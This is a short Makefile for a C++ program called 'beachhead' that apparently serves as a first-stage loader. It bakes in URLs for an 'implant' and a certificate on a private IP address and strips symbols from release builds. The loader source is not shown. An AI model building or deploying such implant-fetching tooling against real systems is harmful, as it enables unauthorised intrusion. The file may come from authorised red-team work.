# Beachhead Makefile
# Usage:
#   make          - build release version (stripped, no debug output)
#   make debug    - build debug version (symbols, verbose logging)

URL ?= "http://10.37.1.249/implant"
CERT_URL = "http://10.37.1.249/cert.pem"

CXX = g++

# Release flags (default)
RELEASE_FLAGS = -O2 -s -DURL='$(URL)' -DCERT_URL='$(CERT_URL)'

# Debug flags (add -DDEBUG, -g, remove -s)
DEBUG_FLAGS = -O0 -g -DDEBUG -DURL='$(URL)' -DCERT_URL='$(CERT_URL)'

TARGET = beachhead
SRC = beachhead.cpp

all: $(TARGET)

$(TARGET): $(SRC)
	$(CXX) $(RELEASE_FLAGS) -o $(TARGET) $(SRC)

debug: $(SRC)
	$(CXX) $(DEBUG_FLAGS) -o $(TARGET) $(SRC)
	@echo "[+] Debug build complete: $(TARGET) (symbols retained, logging enabled)"

clean:
	rm -f $(TARGET)

.PHONY: all debug clean
